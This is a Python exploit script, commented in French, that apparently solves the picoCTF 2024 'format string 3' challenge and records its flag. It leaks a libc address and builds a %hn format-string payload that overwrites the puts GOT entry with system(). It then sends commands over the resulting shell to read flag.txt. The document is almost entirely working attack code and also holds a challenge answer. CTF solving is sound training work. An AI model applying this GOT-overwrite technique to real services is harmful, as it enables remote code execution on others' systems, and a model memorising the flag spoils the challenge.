# 449 - format string 3  (Binary Exploitation, picoCTF 2024)
# Flag: academy{G07_G07?_d4aea0bd}
# Write-up: ../../../writeups/binary-exploitation/449-format-string-3.md
# Script exact utilise pour produire le flag.
#
import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "chatelaine.cylabacademy.net", 23380
SETVBUF_OFF = 0x7A3F0
SYSTEM_OFF = 0x4F760
GOT_PUTS = 0x404000
BUFPOS = 38

s = socket.create_connection((HOST, PORT), timeout=12)
s.settimeout(5)
time.sleep(0.6)
banner = b""
try:
    banner = s.recv(8192)
except Exception:
    pass
m = re.search(rb"0x[0-9a-f]+", banner)
if not m:
    print("pas de leak:", banner[:200])
    sys.exit(1)
leak = int(m.group(0), 16)
system = leak - SETVBUF_OFF + SYSTEM_OFF
print("leak:", hex(leak), "system:", hex(system))

w0 = system & 0xFFFF
w1 = (system >> 16) & 0xFFFF
w2 = (system >> 32) & 0xFFFF
targets = [(GOT_PUTS, w0), (GOT_PUTS + 2, w1), (GOT_PUTS + 4, w2)]
targets.sort(key=lambda t: t[1])
print("cibles:", [(hex(a), hex(v)) for a, v in targets])

# construire la spec
spec = ""
prev = 0
for i, (addr, val) in enumerate(targets):
    delta = (val - prev) & 0xFFFF
    if delta:
        spec += f"%{delta}c"
    spec += f"%{BUFPOS + i}$hn"
    prev = val
# Hmm : la position depend de l'offset des adresses, calculons apres le padding
# on recommence proprement :
def build(base_pos):
    spec = ""
    prev = 0
    for i in range(3):
        val = targets[i][1]
        delta = (val - prev) & 0xFFFF
        if delta:
            spec += f"%{delta}c"
        spec += f"%{base_pos + i}$hn"
        prev = val
    return spec

# premiere passe pour connaitre la longueur
spec = build(BUFPOS)
pad = (-len(spec)) % 8
naddr = len(spec) + pad
pos0 = BUFPOS + naddr // 8
spec = build(pos0)
pad = (-len(spec)) % 8
pos0 = BUFPOS + (len(spec) + pad) // 8
spec = build(pos0)
pad = (-len(spec)) % 8
print("spec:", spec, "len:", len(spec), "pad:", pad, "pos0:", pos0)
payload = spec.encode() + b"P" * pad
for addr, val in targets:
    payload += struct.pack("<Q", addr)
print("payload len:", len(payload))

s.sendall(payload + b"\n")
time.sleep(0.8)
out = b""
try:
    out = s.recv(65536)
except Exception:
    pass
print("apres payload:", out[-200:])
# normalement puts("/bin/sh") => system("/bin/sh") => shell
s.sendall(b"echo SHELL_OK; id; cat flag.txt; ls\n")
time.sleep(1.5)
out2 = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        out2 += chunk
except Exception:
    pass
txt = out2.decode("utf-8", "replace")
print("=== SHELL ===")
print(txt[:1500])
mm = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
if mm:
    print("FLAG:", mm.group(0))
s.close()
